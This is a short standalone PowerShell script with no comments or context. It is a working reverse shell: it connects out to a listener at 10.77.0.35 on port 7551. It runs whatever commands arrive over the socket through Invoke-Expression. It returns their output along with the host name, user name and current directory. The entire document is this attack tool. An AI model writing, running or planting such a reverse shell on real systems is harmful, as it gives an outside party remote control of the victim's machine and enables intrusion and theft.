$tcpClient = New-Object System.Net.Sockets.TCPClient("10.77.0.35", 7551)
$stream = $tcpClient.GetStream()
[byte[]]$buffer = 0..65535 | ForEach-Object { 0 }

while (($readLength = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $readLength)
    $commandOutput = (iex $data 2>&1 | Out-String )
    $computerName = echo $env:computername
    $userName = echo $env:username
    $prompt = $computerName + " " + "[" + $userName + "]" + " | " + (pwd).Path + "> "
    $sendBuffer = ([text.encoding]::ASCII).GetBytes($commandOutput + $prompt)
    $stream.Write($sendBuffer, 0, $sendBuffer.Length)
    $stream.Flush()
}
$tcpClient.Close()
